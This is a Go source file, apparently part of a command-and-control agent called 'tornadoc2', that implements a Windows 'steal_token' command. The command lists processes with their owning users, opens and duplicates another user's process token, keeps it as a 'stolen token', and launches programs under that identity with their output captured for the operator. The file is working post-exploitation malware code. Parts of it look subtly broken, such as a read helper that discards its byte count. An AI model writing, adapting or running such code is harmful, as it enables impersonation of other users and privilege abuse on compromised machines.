//go:build windows

package core

// Requirements: the calling process must hold SeImpersonatePrivilege
// or SeDebugPrivilege for the impersonate step to succeed against a
// process owned by a different user. On a default Windows install
// this means the agent is running as an administrator or as SYSTEM.

import (
	"context"
	"fmt"
	"sort"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"tornadoc2/agent/native"
)

var (
	modAdvapi32 = syscall.NewLazyDLL("advapi32.dll")
	modKernel32 = syscall.NewLazyDLL("kernel32.dll")

	procCreatePipe              = modKernel32.NewProc("CreatePipe")
	procPeekNamedPipe           = modKernel32.NewProc("PeekNamedPipe")
	procCreateToolhelpSnapshot  = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW         = modKernel32.NewProc("Process32FirstW")
	procProcess32NextW          = modKernel32.NewProc("Process32NextW")
	procTerminateProcess        = modKernel32.NewProc("TerminateProcess")
	procGetExitCodeProcess      = modKernel32.NewProc("GetExitCodeProcess")

	procOpenProcessToken        = modAdvapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx        = modAdvapi32.NewProc("DuplicateTokenEx")
	procLookupAccountSidW       = modAdvapi32.NewProc("LookupAccountSidW")
	procCreateProcessWithTokenW = modAdvapi32.NewProc("CreateProcessWithTokenW")
)

const (
	processQueryLimitedInformation = 0x1000
	processQueryInformation        = 0x0400
	tokenQuery                     = 0x0008
	tokenDuplicate                 = 0x0002

	// DuplicateTokenEx values.
	securityImpersonation = 2
	tokenPrimary          = 1

	// CreateProcessWithTokenW flags.
	startfUseStdHandles      = 0x00000100
	createUnicodeEnvironment = 0x00000400
	createNoWindow           = 0x08000000

	// Pipe read/write handles inherit flag.
	handleFlagInherit = 0x00000001
)

var heldUserLabel string

func setStolenToken(h syscall.Handle, user string) {
	native.InstallStolenToken(uintptr(h), procCloseHandle)
	heldUserLabel = user
}

func getStolenToken() (syscall.Handle, string) {
	return syscall.Handle(native.HeldToken()), heldUserLabel
}

func hasStolenToken() bool {
	return native.HasStolenToken()
}

func clearStolenToken() {
	native.CloseStolenTokenOnExit()
	heldUserLabel = ""
}

func closeStolenTokenOnExit() {
	clearStolenToken()
}

func lookupTokenUser(token syscall.Handle) (string, error) {
	// First call: query the required buffer size for TOKEN_USER.
	var needed uint32
	procGetTokenInformation.Call(
		uintptr(token),
		uintptr(tokenUser),
		0,
		0,
		uintptr(unsafe.Pointer(&needed)),
	)
	if needed == 0 {
		return "", fmt.Errorf("GetTokenInformation size query failed")
	}

	buf := make([]byte, needed)
	ret, _, errno := procGetTokenInformation.Call(
		uintptr(token),
		uintptr(tokenUser),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)
	if ret == 0 {
		return "", fmt.Errorf("GetTokenInformation: %v", errno)
	}

	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))

	var nameLen, domLen uint32
	var use int32
	procLookupAccountSidW.Call(
		0,
		sidPtr,
		0,
		uintptr(unsafe.Pointer(&nameLen)),
		0,
		uintptr(unsafe.Pointer(&domLen)),
		uintptr(unsafe.Pointer(&use)),
	)
	if nameLen == 0 {
		return "", fmt.Errorf("LookupAccountSid size query failed")
	}

	nameBuf := make([]uint16, nameLen)
	domBuf := make([]uint16, domLen)
	ret, _, errno = procLookupAccountSidW.Call(
		0,
		sidPtr,
		uintptr(unsafe.Pointer(&nameBuf[0])),
		uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&domBuf[0])),
		uintptr(unsafe.Pointer(&domLen)),
		uintptr(unsafe.Pointer(&use)),
	)
	if ret == 0 {
		return "", fmt.Errorf("LookupAccountSid: %v", errno)
	}

	name := syscall.UTF16ToString(nameBuf)
	domain := syscall.UTF16ToString(domBuf)
	if domain != "" {
		return domain + `\` + name, nil
	}
	return name, nil
}

func tokenFromProcess(pid uint32) (syscall.Handle, string, error) {
	procHandle, _, errno := procOpenProcess.Call(
		uintptr(processQueryLimitedInformation),
		0,
		uintptr(pid),
	)
	if procHandle == 0 {
		return 0, "", fmt.Errorf("OpenProcess(%d): %v", pid, errno)
	}
	defer procCloseHandle.Call(procHandle)

	var rawToken syscall.Handle
	ret, _, errno := procOpenProcessToken.Call(
		procHandle,
		uintptr(tokenQuery|tokenDuplicate),
		uintptr(unsafe.Pointer(&rawToken)),
	)
	if ret == 0 {
		return 0, "", fmt.Errorf("OpenProcessToken: %v", errno)
	}
	defer procCloseHandle.Call(uintptr(rawToken))

	var dupToken syscall.Handle
	ret, _, errno = procDuplicateTokenEx.Call(
		uintptr(rawToken),
		0,                    // desired access: 0 = same as source
		0,                    // token attributes
		uintptr(securityImpersonation),
		uintptr(tokenPrimary),
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if ret == 0 {
		return 0, "", fmt.Errorf("DuplicateTokenEx: %v", errno)
	}

	user, err := lookupTokenUser(dupToken)
	if err != nil {
		procCloseHandle.Call(uintptr(dupToken))
		return 0, "", err
	}
	return dupToken, user, nil
}

type procEntry struct {
	pid   uint32
	name  string
	owner string
}

func enumProcesses(userFilter string) ([]procEntry, error) {
	snap, _, errno := procCreateToolhelpSnapshot.Call(
		uintptr(th32csSnapProcess), 0)
	if snap == 0 || snap == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %v", errno)
	}
	defer procCloseHandle.Call(snap)

	// PROCESSENTRY32W layout. On amd64 the struct is 568 bytes: a
	// DWORD size, then a series of DWORD/ULONG_PTR fields, then a
	// 260-wide UTF-16 buffer.
	type processEntry32 struct {
		Size              uint32
		CntUsage          uint32
		ProcessID         uint32
		DefaultHeapID     uintptr
		ModuleID          uint32
		CntThreads        uint32
		ParentProcessID   uint32
		PriClassBase      int32
		Flags             uint32
		ExeFile           [maxPath]uint16
	}

	var pe processEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	ret, _, _ := procProcess32FirstW.Call(
		snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32FirstW failed")
	}

	var entries []procEntry
	for {
		pid := pe.ProcessID
		name := syscall.UTF16ToString(pe.ExeFile[:])

		if pid != 0 {
			owner := "?"
			if h, u, err := tokenFromProcess(pid); err == nil {
				owner = u
				procCloseHandle.Call(uintptr(h))
			}
			entries = append(entries, procEntry{
				pid: pid, name: name, owner: owner,
			})
		}

		ret, _, _ = procProcess32NextW.Call(
			snap, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}

	if userFilter != "" {
		needle := strings.ToLower(userFilter)
		var filtered []procEntry
		for _, e := range entries {
			if strings.Contains(strings.ToLower(e.owner), needle) {
				filtered = append(filtered, e)
			}
		}
		entries = filtered
	}

	sort.Slice(entries, func(i, j int) bool {
		return entries[i].pid < entries[j].pid
	})
	return entries, nil
}

func runAsToken(ctx context.Context, token syscall.Handle,
	program string, args []string) (string, int, error) {

	sa := struct {
		Length             uint32
		SecurityDescriptor uintptr
		InheritHandle      int32
	}{Length: 24, InheritHandle: 1}

	mkPipe := func() (syscall.Handle, syscall.Handle, error) {
		var r, w syscall.Handle
		ret, _, errno := procCreatePipe.Call(
			uintptr(unsafe.Pointer(&r)),
			uintptr(unsafe.Pointer(&w)),
			uintptr(unsafe.Pointer(&sa)),
			0,
		)
		if ret == 0 {
			return 0, 0, fmt.Errorf("CreatePipe: %v", errno)
		}
		return r, w, nil
	}

	stdoutR, stdoutW, err := mkPipe()
	if err != nil {
		return "", -1, err
	}
	defer procCloseHandle.Call(uintptr(stdoutR))
	defer procCloseHandle.Call(uintptr(stdoutW))

	stderrR, stderrW, err := mkPipe()
	if err != nil {
		return "", -1, err
	}
	defer procCloseHandle.Call(uintptr(stderrR))
	defer procCloseHandle.Call(uintptr(stderrW))

	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = startfUseStdHandles
	si.StdOutput = stdoutW
	si.StdErr = stderrW
	si.StdInput = 0

	cmdline := quoteIfNeeded(program)
	if len(args) > 0 {
		cmdline += " " + strings.Join(args, " ")
	}
	cmdlinePtr, _ := syscall.UTF16PtrFromString(cmdline)
	progPtr, _ := syscall.UTF16PtrFromString(program)

	var pi syscall.ProcessInformation
	ret, _, errno := procCreateProcessWithTokenW.Call(
		uintptr(token),
		0,                              // logon flags
		uintptr(unsafe.Pointer(progPtr)),
		uintptr(unsafe.Pointer(cmdlinePtr)),
		uintptr(createUnicodeEnvironment|createNoWindow),
		0,                              // environment: inherit
		0,                              // cwd: inherit
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	procCloseHandle.Call(uintptr(stdoutW))
	procCloseHandle.Call(uintptr(stderrW))
	stdoutW = 0
	stderrW = 0

	if ret == 0 {
		return "", -1,
			fmt.Errorf("CreateProcessWithTokenW: %v", errno)
	}
	defer procCloseHandle.Call(uintptr(pi.Process))
	defer procCloseHandle.Call(uintptr(pi.Thread))

	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			procTerminateProcess.Call(uintptr(pi.Process), 1)
		case <-done:
		}
	}()
	defer close(done)

	stdoutCh := make(chan []byte, 1)
	stderrCh := make(chan []byte, 1)
	go func() { stdoutCh <- drainPipe(stdoutR) }()
	go func() { stderrCh <- drainPipe(stderrR) }()

	out := <-stdoutCh
	errOut := <-stderrCh

	procWaitForSingleObject.Call(uintptr(pi.Process), uintptr(infinite))
	var code uint32
	procGetExitCodeProcess.Call(
		uintptr(pi.Process), uintptr(unsafe.Pointer(&code)))

	combined := mergeStreams(out, errOut)
	return string(combined), int(code), nil
}

func drainPipe(h syscall.Handle) []byte {
	var out []byte
	buf := make([]byte, 4096)
	for {
		var n uint32
		ret, _, _ := procPeekNamedPipe.Call(
			uintptr(h),
			0, 0,
			uintptr(unsafe.Pointer(&n)),
			0, 0,
		)
		if ret == 0 {
			// Pipe closed.
			return out
		}
		if n == 0 {
			// No data yet. Sleep briefly and retry.
			sleepMs(10)
			continue
		}
		var read uint32
		err := readFileHandle(h, buf, &read)
		if err != nil || read == 0 {
			return out
		}
		out = append(out, buf[:read]...)
	}
}

func readFileHandle(h syscall.Handle, buf []byte, n *uint32) error {
	var done uint32
	return syscall.ReadFile(h, buf, &done, nil)
}

func quoteIfNeeded(s string) string {
	if strings.ContainsAny(s, " \t") {
		return `"` + s + `"`
	}
	return s
}

func sleepMs(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

func (a *Agent) stealTokenVerb(ctx context.Context, t Task) Result {
	if len(t.Args) == 0 {
		return Result{ID: t.ID, Error: "steal_token requires a subcommand"}
	}
	sub := strings.ToLower(t.Args[0])

	switch sub {
	case "list":
		filter := ""
		if len(t.Args) > 1 {
			filter = t.Args[1]
		}
		entries, err := enumProcesses(filter)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		var sb strings.Builder
		sb.WriteString("PID      OWNER                                NAME\n")
		sb.WriteString("-------  -----------------------------------  ----\n")
		for _, e := range entries {
			sb.WriteString(fmt.Sprintf("%-7d  %-35s  %s\n",
				e.pid, e.owner, e.name))
		}
		sb.WriteString(fmt.Sprintf("\n[%d process(es)]\n", len(entries)))
		return Result{ID: t.ID,
			Output: encodeOutput([]byte(sb.String()))}

	case "impersonate":
		if len(t.Args) < 2 {
			return Result{ID: t.ID,
				Error: "steal_token impersonate requires a PID"}
		}
		pid64, err := parseUint32(t.Args[1])
		if err != nil {
			return Result{ID: t.ID, Error: "invalid PID"}
		}
		h, user, err := tokenFromProcess(pid64)
		if err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		setStolenToken(h, user)
		return Result{ID: t.ID, Output: encodeOutput([]byte(
			fmt.Sprintf("stolen token from pid %d (%s)\n",
				pid64, user)))}

	case "whoami":
		_, user := getStolenToken()
		if user == "" {
			return Result{ID: t.ID, Output: encodeOutput(
				[]byte("no stolen token held\n"))}
		}
		return Result{ID: t.ID, Output: encodeOutput(
			[]byte(user + "\n"))}

	case "revert":
		clearStolenToken()
		return Result{ID: t.ID, Output: encodeOutput(
			[]byte("token released\n"))}

	default:
		return Result{ID: t.ID,
			Error: "unknown steal_token subcommand: " + sub}
	}
}

func execWithStolenToken(ctx context.Context,
	program string, args []string) (string, int, error) {
	h := native.HeldToken()
	if h == 0 {
		return "", -1, fmt.Errorf("no stolen token held")
	}
	return runAsToken(ctx, syscall.Handle(h), program, args)
}

func parseUint32(s string) (uint32, error) {
	var n uint64
	for _, c := range s {
		if c < '0' || c > '9' {
			return 0, fmt.Errorf("not a number")
		}
		n = n*10 + uint64(c-'0')
		if n > 0xFFFFFFFF {
			return 0, fmt.Errorf("out of range")
		}
	}
	return uint32(n), nil
}